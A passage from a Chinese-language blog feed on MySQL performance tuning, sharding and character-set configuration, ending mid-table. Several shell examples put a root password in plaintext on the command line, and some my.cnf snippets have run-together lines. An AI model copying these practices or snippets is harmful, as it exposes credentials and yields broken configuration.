|</span><br><span class="line">| Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> test2;</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| name&#xA0; |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| aaaaa |</span><br><span class="line">| aaaaa |</span><br><span class="line">| aaaaa |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">status</span> <span class="keyword">like</span> <span class="string">&apos;%key_read%&apos;</span>;</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x603B;&#x7ED3;&#xFF1A;<br>1&#x3001;&#x770B;&#x673A;&#x5668;&#x914D;&#x7F6E;&#xFF0C;&#x6307;&#x4E09;&#x5927;&#x4EF6;&#xFF1A;cpu&#x3001;&#x5185;&#x5B58;&#x3001;&#x786C;&#x76D8;<br>2&#x3001;&#x770B;mysql&#x914D;&#x7F6E;&#x53C2;&#x6570;<br>3&#x3001;&#x67E5;&#x770B;mysql&#x884C;&#x72B6;&#x6001;<br>4&#x3001;&#x67E5;&#x770B;mysql&#x7684;&#x6162;&#x67E5;&#x8BE2;<br>&#x4F9D;&#x6B21;&#x89E3;&#x51B3;&#x4E86;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x627E;&#x7A0B;&#x5E8F;&#x65B9;&#x9762;&#x7684;&#x95EE;&#x9898;  </p><p>#&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x53CD;&#x89E3;&#x6790;,&#x6CE8;&#x610F;&#x7531;&#x6B64;&#x5E26;&#x6765;&#x7684;&#x6743;&#x9650;/&#x6388;&#x6743;&#x95EE;&#x9898;&#xFF1B;&#x5173;&#x95ED; MySQL &#x7684; DNS &#x53CD;&#x67E5;&#x529F;&#x80FD;&#xFF1B;&#x8FD9;&#x6837;&#x901F;&#x5EA6;&#x5C31;&#x5FEB;&#x4E86;!<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# echo skip-name-resolve &gt;&gt; /etc/my.cnf</span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x9009;&#x9879;&#x5C31;&#x80FD;&#x7981;&#x7528;DNS &#x89E3;&#x6790;&#xFF0C;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x4F1A;&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x4E0D;&#x80FD;&#x5728;MySQL &#x7684;&#x6388;&#x6743;&#x8868;&#x4E2D;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x540D;&#x4E86;&#x800C;&#x53EA;&#x80FD;&#x7528;IP&#x683C;&#x5F0F;  </p><p>#&#x7D22;&#x5F15;&#x7F13;&#x5B58;,&#x6839;&#x636E;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x800C;&#x5B9A;,&#x5982;&#x679C;&#x662F;&#x72EC;&#x7ACB;&#x7684; DB &#x670D;&#x52A1;&#x5668;,&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x9AD8;&#x8FBE;80%&#x7684;&#x5185;&#x5B58;&#x603B;&#x91CF;  </p><pre><code>key_buffer_size=512M</code></pre><p>#&#x6253;&#x5F00;&#x8868;&#x7F13;&#x5B58;&#x603B;&#x4E2A;&#x6570;,&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x9891;&#x7E41;&#x7684;&#x6253;&#x5F00;&#x6570;&#x636E;&#x8868;&#x4EA7;&#x751F;&#x7684;&#x5F00;&#x9500;  </p><pre><code>table_open_cache=24query_cache_size=128M max_connections=10000 #&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;</code></pre><p>#&#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x65F6;&#x95F4;,&#x80FD;&#x907F;&#x514D;&#x957F;&#x8FDE;&#x63A5;  </p><pre><code>wait_timeout=60</code></pre><p>#&#x8BB0;&#x5F55;&#x6162;&#x67E5;&#x8BE2;,&#x7136;&#x540E;&#x5BF9;&#x6162;&#x67E5;&#x8BE2;&#x4E00;&#x4E00;&#x4F18;&#x5316;&#x5355;&#x4F4D;&#xFF1A;&#x79D2;  </p><pre><code>slow-queries- log-file=/var/lib/mysql/slow.loglong_query_time=5</code></pre><h3 id="&#x6269;&#x5C55;-MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;"><a href="#&#x6269;&#x5C55;-MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;" class="headerlink" title="&#x6269;&#x5C55; MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;"></a>&#x6269;&#x5C55; MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;</h3><p>1 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4EC0;&#x4E48;&#x662F;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F;<br>&#x4ECE;&#x5B57;&#x9762;&#x4E0A;&#x7B80;&#x5355;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x5E93;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x5E93;&#x4E0A;&#xFF0C;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x8868;&#x4E0A;&#x3002;  </p><p>2 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F;<br>     &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x5728;&#x672A;&#x8FDB;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF0C;&#x76F8;&#x5E94;&#x5730;&#xFF0C;&#x6570;&#x636E;&#x64CD;&#x4F5C;&#xFF0C;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x5F00;&#x9500;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1B;&#x53E6;&#x5916;&#xFF0C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#xFF08;CPU&#x3001;&#x78C1;&#x76D8;&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x7B49;&#xFF09;&#x662F;&#x6709;&#x9650;&#x7684;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5E93;&#x6240;&#x80FD;&#x627F;&#x8F7D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x3001;&#x6570;&#x636E;&#x5904;&#x7406;&#x80FD;&#x529B;&#x90FD;&#x5C06;&#x906D;&#x9047;&#x74F6;&#x9888;  </p><p>3 &#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x5B9E;&#x65BD;&#x7B56;&#x7565;&#x3002;<br>     &#x5982;&#x679C;&#x4F60;&#x7684;&#x5355;&#x673A;&#x6027;&#x80FD;&#x5F88;&#x4F4E;&#x4E86;&#xFF0C;&#x90A3;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5206;&#x5E93;&#x3002;&#x5206;&#x5E93;&#xFF0C;&#x4E1A;&#x52A1;&#x900F;&#x660E;&#xFF0C;&#x5728;&#x7269;&#x7406;&#x5B9E;&#x73B0;&#x4E0A;&#x5206;&#x6210;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5206;&#x5E93;&#x5728;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x5206;&#x533A;&#x53EF;&#x4EE5;&#x628A;&#x8868;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x4F46;&#x4E0D;&#x80FD;&#x5206;&#x914D;&#x5230;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;&#x662F;&#x6709;&#x9650;&#x5236;&#x7684;&#xFF0C;&#x7528;&#x5206;&#x5E93;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x5355;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x4E0D;&#x591F;&#xFF0C;&#x6216;&#x8005;&#x6210;&#x672C;&#x8FC7;&#x9AD8;&#x95EE;&#x9898;&#x3002;  </p><p>&#x5F53;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x8868;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#xFF0C;&#x5904;&#x7406;&#x4E0D;&#x8FC7;&#x6765;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x7528;&#x5206;&#x5E93;&#x3002;<br>orderid,userid,ordertime,&#x2026;..<br>userid%4=0&#xFF0C;&#x7528;&#x5206;&#x5E93;1<br>userid%4=1&#xFF0C;&#x7528;&#x5206;&#x5E93;2<br>userid%4=2, &#x7528;&#x5206;&#x5E93;3<br>userid%4=3&#xFF0C;&#x7528;&#x5206;&#x5E93;4  </p><p>&#x4E0A;&#x9762;&#x8FD9;&#x4E2A;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x5206;&#x5E93;&#x8DEF;&#x7531;&#xFF0C;&#x6839;&#x636E;userid&#x9009;&#x62E9;&#x5206;&#x5E93;&#xFF0C;&#x5373;&#x4E0D;&#x540C;&#x7684;&#x670D;&#x52A1;&#x5668;  </p><p>4 &#x5206;&#x5E93;&#x5206;&#x8868;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x3002;  </p><p>4.1 &#x4E8B;&#x52A1;&#x95EE;&#x9898;&#x3002;<br>     &#x5728;&#x6267;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5230;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x51FA;&#x73B0;&#x4E86;&#x56F0;&#x96BE;&#x3002;&#x5982;&#x679C;&#x4F9D;&#x8D56;&#x6570;&#x636E;&#x5E93;&#x672C;&#x8EAB;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x53BB;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5C06;&#x4ED8;&#x51FA;&#x9AD8;&#x6602;&#x7684;&#x6027;&#x80FD;&#x4EE3;&#x4EF7;&#xFF1B;&#x5982;&#x679C;&#x7531;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53BB;&#x534F;&#x52A9;&#x63A7;&#x5236;&#xFF0C;&#x5F62;&#x6210;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x4E0A;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x53C8;&#x4F1A;&#x9020;&#x6210;&#x7F16;&#x7A0B;&#x65B9;&#x9762;&#x7684;&#x8D1F;&#x62C5;&#x3002;  </p><p>4.2 &#x8DE8;&#x5E93;&#x8DE8;&#x8868;&#x7684;join&#x95EE;&#x9898;&#x3002;<br>    &#x5728;&#x6267;&#x884C;&#x4E86;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x96BE;&#x4EE5;&#x907F;&#x514D;&#x4F1A;&#x5C06;&#x539F;&#x672C;&#x903B;&#x8F91;&#x5173;&#x8054;&#x6027;&#x5F88;&#x5F3A;&#x7684;&#x6570;&#x636E;&#x5212;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x8868;&#x3001;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x8FD9;&#x65F6;&#xFF0C;&#x8868;&#x7684;&#x5173;&#x8054;&#x64CD;&#x4F5C;&#x5C06;&#x53D7;&#x5230;&#x9650;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;join&#x4F4D;&#x4E8E;&#x4E0D;&#x540C;&#x5206;&#x5E93;&#x7684;&#x8868;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;join&#x5206;&#x8868;&#x7C92;&#x5EA6;&#x4E0D;&#x540C;&#x7684;&#x8868;&#xFF0C;&#x7ED3;&#x679C;&#x539F;&#x672C;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x80FD;&#x591F;&#x5B8C;&#x6210;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x3002;  </p><p>4.3 &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#x548C;&#x6570;&#x636E;&#x8FD0;&#x7B97;&#x538B;&#x529B;&#x3002;<br>     &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#xFF0C;&#x6700;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#x548C;&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x91CD;&#x590D;&#x6267;&#x884C;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x89E3;&#x51B3;&#xFF0C;&#x4F46;&#x5FC5;&#x7136;&#x5F15;&#x8D77;&#x989D;&#x5916;&#x7684;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x6210;&#x7EE9;&#x7684;&#x7528;&#x6237;&#x6570;&#x636E;&#x8868;userTable&#xFF0C;&#x4E1A;&#x52A1;&#x8981;&#x6C42;&#x67E5;&#x51FA;&#x6210;&#x7EE9;&#x6700;&#x597D;&#x7684;100&#x4F4D;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x524D;&#xFF0C;&#x53EA;&#x9700;&#x4E00;&#x4E2A;order by&#x8BED;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x9700;&#x8981;n&#x4E2A;order by&#x8BED;&#x53E5;&#xFF0C;&#x5206;&#x522B;&#x67E5;&#x51FA;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x8868;&#x7684;&#x524D;100&#x540D;&#x7528;&#x6237;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x8BA1;&#x7B97;&#xFF0C;&#x624D;&#x80FD;&#x5F97;&#x51FA;&#x7ED3;&#x679C;&#x3002;  </p><p>MySQL5.7 &#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://dev.mysql.com/doc/refman/5.7/en/" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E2A;&amp;#x670D;&amp;#x52A1;&amp;#x7684;&amp;#x8FC7;&amp;#x7A0B;&amp;#xFF1A;&quot;&gt;&lt;a href=&quot;#&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E2A;&amp;#x670D;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL备份与恢复（删库不跑路）</title>
    <link href="https://marnm.github.io//posts/269a56e8/"/>
    <id>https://marnm.github.io//posts/269a56e8/</id>
    <published>2022-06-07T04:44:29.000Z</published>
    <updated>2022-06-07T05:13:38.103Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;"><a href="#&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;" class="headerlink" title="&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;"></a>&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;</h3><p><strong>1&#xFF1A;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD;</strong><br>&#x5B57;&#x7B26;&#x96C6;&#x5C31;&#x662F;&#x4E00;&#x5957;&#x6587;&#x5B57;&#x7B26;&#x53F7;&#x53CA;&#x5176;&#x7F16;&#x7801;&#x3001;&#x6BD4;&#x8F83;&#x89C4;&#x5219;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x5B57;&#x7B26;&#x96C6;ASC2&#xFF1B;MySQL&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;&#x5305;&#x62EC;&#x5B57;&#x7B26;&#x96C6;&#xFF08;CHARACTER&#xFF09;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF08;COLLATION&#xFF09;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5176;&#x4E2D;&#x5B57;&#x7B26;&#x96C6;&#x7528;&#x6765;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#xFF0C;&#x800C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x5B9A;&#x4E49;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65B9;&#x5F0F;</p><p><strong>2&#xFF1A;MySQL&#x6570;&#x636E;&#x5E93;&#x5E38;&#x89C1;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD;</strong></p><p>&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x56FD;&#x9645;&#x6807;&#x51C6;&#x7684;utf8</p><p><strong>3&#xFF1A;MySQL&#x600E;&#x6837;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong><br>1&#x3001;&#x5982;&#x679C;&#x5904;&#x7406;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x6587;&#x5B57;&#xFF0C;&#x53D1;&#x5E03;&#x5230;&#x4E0D;&#x540C;&#x8BED;&#x8A00;&#x56FD;&#x5BB6;&#x5730;&#x533A;&#xFF0C;&#x5E94;&#x9009;Unicode&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x5BF9;MySQL&#x6765;&#x8BF4;&#x5C31;&#x662F;utf8(&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x4E09;&#x4E2A;&#x5B57;&#x8282;)<br>2&#x3001;&#x5982;&#x679C;&#x53EA;&#x662F;&#x9700;&#x8981;&#x652F;&#x6301;&#x4E2D;&#x6587;&#xFF0C;&#x5E76;&#x4E14;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x9AD8;&#xFF0C;&#x53EF;&#x9009;GBK(&#x5B9A;&#x957F;&#xFF0C;&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x5360;&#x53CC;&#x5B57;&#x8282;&#xFF0C;&#x82F1;&#x6587;&#x4E5F;&#x5360;&#x53CC;&#x5B57;&#x8282;)&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5927;&#x91CF;&#x8FD0;&#x7B97;&#xFF0C;&#x6BD4;&#x8F83;&#x6392;&#x5E8F;&#x7B49;&#xFF0C;&#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x96C6;&#x66F4;&#x5FEB;&#xFF0C;&#x6027;&#x80FD;&#x4E5F;&#x9AD8;<br>3&#x3001;&#x5904;&#x7406;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x4F7F;&#x7528;utf8mb4&#x5B57;&#x7B26;&#x96C6;</p><p><strong>4&#xFF1A;&#x67E5;&#x770B;&#x5F53;&#x524D;MySQL&#x652F;&#x6301;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong></p><p>MySQL&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x540C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E93;&#x6216;&#x8868;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x90FD;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6;</p><pre><code>mysql -uroot -pJaking@vip.163.com -e &quot;show character set \G;&quot;  #&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B57;&#x7B26;&#x96C6;</code></pre><p>&#x67E5;&#x770B;&#x5E38;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;</p><pre><code>mysql -uroot -pJaking@vip.163.com -e &quot;show character set\G;&quot; |egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos;</code></pre><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com -e &quot;show character set\G;&quot; | egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: latin1</span><br><span class="line">Default collation: latin1_swedish_ci</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: gbk</span><br><span class="line">Default collation: gbk_chinese_ci</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: utf8</span><br><span class="line">Default collation: utf8_general_ci</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: utf8mb4</span><br><span class="line">Default collation: utf8mb4_general_ci</span><br></pre></td></tr></tbody></table></figure><p><strong>5&#xFF1A;&#x67E5;&#x770B;MySQL&#x5F53;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8BBE;&#x7F6E;&#x60C5;&#x51B5;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;character_set%&apos;;</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">| character_set_client&#xA0;&#xA0;&#xA0;&#xA0; | 